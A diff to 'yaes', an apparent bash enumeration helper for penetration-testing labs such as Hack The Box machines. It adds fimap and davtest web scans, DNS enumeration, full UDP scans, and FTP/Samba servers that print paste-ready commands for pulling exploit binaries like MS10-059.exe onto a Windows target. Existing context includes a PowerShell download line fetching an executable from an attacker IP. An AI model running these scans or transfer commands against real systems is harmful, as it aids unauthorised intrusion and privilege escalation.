@@ -1,7 +1,8 @@
 #!/bin/bash
 
 # ideas:
-# fimap - follow any links found on webpage
+# davtest - davtest -url http://granny/ if found webdav
+
 
 # yaes - yet another enumeration script
 # v0.0.1
@@ -27,6 +28,7 @@ web_services=0
 samba_services=0
 ftp_services=0
 ssh_services=0
+dns_services=0
 wp_found=0
 
 tcp_deep_scan=0
@@ -108,6 +110,46 @@ function cheatsheet
   echo "powershell -NoLogo -Command \"\$webClient = new-object System.Net.WebClient; \$webClient.DownloadFile('http://10.10.16.10:80/vdmallowed.exe', 'vdmallowed.exe')\""
   echo ""
 
+}
+
+function serve_ftp
+{
+  file=${1}
+  if [[ -z ${file} ]]
+  then
+    file="<your filename here>"
+  fi
+  decho_green "setting up ftp server for files in $( pwd ) directory..."
+  local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
+  decho "paste commands below to windows host..."
+  echo "echo open ${local_ip} 21 > ftp.txt"
+  echo "echo user anonymous >> ftp.txt"
+  echo "echo password >> ftp.txt"
+  echo "echo bin >> ftp.txt"
+  echo "echo mget ${filename} >> ftp.txt"
+  echo "echo bye >> ftp.txt"
+  echo "ftp -i -n -s:ftp.txt"
+  echo ""
+  decho_green "press ctrl+c to stop ftp server..."
+  twistd -n ftp -p 21 -r . > /dev/null
+  
+}
+
+
+function serve_samba
+{
+  decho_green "setting up samba share for files in $( pwd ) directory..."
+  file=${1}
+  if [[ -z ${file} ]]
+  then
+    file="<your filename here>"
+  fi
+  local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
+  decho "paste commands below on windows host to access file over samba..."
+  echo "\\${local_ip}\MS10-059.exe"
+  echo ""
+  decho_green "press ctrl+c to stop ftp server..."
+  impacket-smbserver hacker $( pwd ) > /dev/null
 }
 
 function sherlock
@@ -227,6 +269,8 @@ function help
     decho "or... --web-proxy <target> <port> - this will run socat and let you access website over your hacking box port ${proxy_port}"
     decho "or... --quick-serve - runs local http server on ${web_port}, prints links to download files in current directory with powershell"
     decho "or... --http-server [download client] - runs simple http server, shows ready to copy & paste commands to run all kinds of scripts, enumeration, post-exploitation etc. using chosen client on target (wget by default)"
+    decho "or... --ftp-server <filename> - runs ftp server in current directory, prints commands to download file to windows host using it"
+    decho "or... --samba-server <filename> - runs samba server in current directory, prints commands to access file on windows host using it"
     decho "or... --windows-exploit-suggest <target workspace directory> - runs simple http server, serves nc.exe to automate pass of systeminfo to local windows-exploit-suggester, runs it, makes suggestion on reliable exploits"
     decho "or... --sherlock <target workspace directory> - runs simple http server, serves nc.exe to automate pass of Sherlock.ps1 script output"
     decho "missing parameters, hostname or filename with hostnames required" 
@@ -241,6 +285,8 @@ function help
     decho "or... --web-proxy <target> <port> - this will run socat and let you access website over your hacking box port ${proxy_port}"
     decho "or... --quick-serve - runs local http server on ${web_port}, prints links to download files in current directory with powershell"
     decho "or... --http-server <download client> - runs simple http server, shows ready to copy & paste commands to run all kinds of scripts, enumeration, post-exploitation etc. using chosen client on target (wget by default)"
+    decho "or... --ftp-server <filename> - runs ftp server in current directory, prints commands to download file to windows host using it"
+    decho "or... --samba-server <filename> - runs samba server in current directory, prints commands to access file on windows host using it"
     decho "or... --windows-exploit-suggest <target workspace directory> - runs simple http server, serves nc.exe to automate pass of systeminfo to local windows-exploit-suggester, runs it, makes suggestion on reliable exploits"
     decho "or... --sherlock <target workspace directory> - runs simple http server, serves nc.exe to automate pass of Sherlock.ps1 script output"
     exit 0
@@ -315,6 +361,19 @@ function help
     exit 0
   fi
 
+  if [[ "${mode}" == "--ftp-server"  ]]
+  then
+    source ${config_path}
+    serve_ftp ${option_2}
+    exit 0
+  fi
+
+  if [[ "${mode}" == "--samba-server"  ]]
+  then
+    source ${config_path}
+    serve_samba ${option_2}
+    exit 0
+  fi
 
   if [[ "${mode}" == "--sherlock"  ]]
   then
@@ -399,6 +458,7 @@ function help
   fi
 
   target=${mode}
+  mkdir ${target}
   exec > >(tee ${target}/yaes.log)
   decho_green "starting yaes..."
 }
@@ -495,26 +555,27 @@ function web_scanners
   whatweb_logs="${logs_path}/${target}/whatweb"
   mkdir -p "${whatweb_logs}"
 
+  fimap_logs="${logs_path}/${target}/fimap"
+  mkdir -p "${fimap_logs}"
 
-  if [[ ${port} -eq 80 ]]
+  webdav_logs="${logs_path}/${target}/webdav"
+  mkdir -p "${webdav_logs}"
+
+
+  decho "checking available methods on ${target}/${port}..."
+  nmap -p${port} --script=http-methods.nse ${target}
+
+  if [[ ${port} -eq 443 ]]
   then
-    decho "running whatweb on ${target}/${port}..."
-    whatweb http://${target}:${port}/ | tee ${whatweb_logs}/${target}.tcp.${port}.whatweb
-
-    nikto -port ${port} -host http://${target}/ &> ${nikto_logs}/${target}.tcp.${port}.nikto &
-    long_jobs_pids+=(${!})
-    decho "running nikto on ${target}/${port} in background..."
-
-    gobuster -k -w ${gobuster_wordlist} -u http://${target}:${port}/ -r -t 200 &> ${gobuster_logs}/${target}.tcp.${port}.gobuster &
-    long_jobs_pids+=(${!})
-    decho "running gobuster on ${target}/${port} in background..."
-
     
-    check_wp "http://${target}:${port}/"
-  elif [[ ${port} -eq 443 ]]
-  then
     decho "running whatweb on ${target}/${port}..."
     whatweb https://${target}:${port}/ | tee ${whatweb_logs}/${target}.tcp.${port}.whatweb
+
+    decho "running fimap on ${target}/${port}..."
+    fimap -D -H -4 -u "https://${target}:${port}/" | tee ${fimap_logs}/${target}.tcp.${port}.fimap
+
+    decho "testing webdav..."
+    davtest -url https://${target}/ | tee ${webdav_logs}/${target}.tcp.${port}.webdav
 
     nikto -port ${port} -host https://${target}/ &> ${nikto_logs}/${target}.tcp.${port}.nikto &
     long_jobs_pids+=(${!})
@@ -529,6 +590,12 @@ function web_scanners
     decho "running whatweb on ${target}/${port}..."
     whatweb http://${target}:${port}/ | tee ${whatweb_logs}/${target}.tcp.${port}.whatweb
 
+    decho "running fimap on ${target}/${port}..."
+    fimap -D -H -4 -u "http://${target}:${port}/" | tee ${fimap_logs}/${target}.tcp.${port}.fimap
+
+    decho "testing webdav..."
+    davtest -url http://${target}/ | tee ${webdav_logs}/${target}.tcp.${port}.webdav
+
     nikto -port ${port} -host http://${target}/ &> ${nikto_logs}/${target}.tcp.${port}.nikto &
     long_jobs_pids+=(${!})
     decho "running nikto on ${target}/${port} in background..."
@@ -537,7 +604,7 @@ function web_scanners
     long_jobs_pids+=(${!})
     decho "running gobuster on ${target}/${port} in background..."
 
-    check_wp "https://${target}:${port}/"
+    check_wp "http://${target}:${port}/"
   fi
 }
 
@@ -555,7 +622,7 @@ function long_scans
   tcp_deep_scan=${!}
 
   decho "starting long deep udp scan in background..."
-  nmap -T5 -sU -p0-10 -sC -oX  ${nmap_logs}/${target}.nmap.udp.deep.output.xml -e ${iface} ${target} &> ${nmap_logs}/${target}.nmap.udp.deep.output.log &
+  nmap -T4 -sU -p- -sC -oX  ${nmap_logs}/${target}.nmap.udp.deep.output.xml -e ${iface} ${target} &> ${nmap_logs}/${target}.nmap.udp.deep.output.log &
   udp_deep_scan=${!}
 
   nmap -e ${iface} -A -sV -sC -oX ${nmap_logs}/${target}.tcp.detailed.xml -oG ${nmap_logs}/${target}.tcp.detailed.nmap.grep -p ${t_ports} ${target} &> ${nmap_logs}/${target}.nmap.tcp.detailed.output.log &
@@ -612,6 +679,14 @@ function long_scans
         decho "port ${port} seems like samba service, starting samba enumeration..."
         samba_services=1
         samba_scan ${target} ${port}
+      fi
+
+      if egrep -q "dns" ${amap_logs}/${target}.tcp.${port}.amap.log
+      then
+        decho "port ${port} seems like dns, starting dns enumeration..."
+        dns_services=1
+        dig @${target} ${target} any
+        #fierce -dns cronos.htb
       fi
 
 
@@ -699,7 +774,9 @@ function web_results
     cat ${file} | tail -n +6
   done
 
+  gobuster_logs="${logs_path}/${target}/gobuster"
   gobuster_results=$( ls ${gobuster_logs}/ | wc -l )
+
   found_dirs=( )
   if [[ ${gobuster_results} -eq 2 ]]
   then
@@ -718,16 +795,17 @@ function web_results
       decho_green "directories are different!"
       for file in ${gobuster_logs}/*
       do
-        address=$( cat ${file} | egrep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*:[0-9]*" )
+        #address=$( cat ${file} | egrep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*:[0-9]*" )
+        address=$( cat ${file} | egrep -o "http://.*" )
         decho "directories for ${address}..."
         cat ${file} | egrep -i "status:" | sort 
       done
     fi
   else
-    decho "listing directories..."
     for file in ${gobuster_logs}/*
       do
-        address=$( cat ${file} | egrep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*:[0-9]*" )
+        address=$( cat ${file} | egrep -o "http://.*" )
+        #address=$( cat ${file} | egrep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*:[0-9]*" )
         decho "directories for ${address}..."
         cat ${file} | egrep -i "status:" | sort 
       done
@@ -758,7 +836,7 @@ function display_report
 
   if [[ ${no_udp} -eq 0 ]]
   then
-    decho_green "found open ports/services for tcp..."
+    decho_green "found open ports/services for udp..."
     cat ${nmap_logs}/${target}.nmap.udp.detailed.output.log
   fi
 
@@ -816,17 +894,21 @@ function loop_jobs
     do
       if  ps -p ${job} > /dev/null 
       then
-        decho "job ${job} still running... $( ps -p ${job} --no-headers | awk ' { print $NF } ' )"
-        progress=$((progress+1))
+        #decho "job ${job} still running... $( ps -p ${job} --no-headers | awk ' { print $NF } ' )"
         all_done=0
       fi
     done
+
+    progress=$((progress+1))
+
     if [[ ${all_done} -eq 1 ]]
     then
       finished=1
     fi
 
-    if [[ ${progress} -eq 5 ]]
+    #decho "current progres outside... ${progress}"
+
+    if [[ ${progress} -eq 6 ]]
     then
       decho_red "scan still not finished, partial results, so you can start looking..."
       if [[ ${web_services} -eq 1 ]]
@@ -835,8 +917,8 @@ function loop_jobs
       fi
       progress=0
     fi
-  sleep 20
-done
+    sleep 90
+  done
 }
 
 function brute_force 
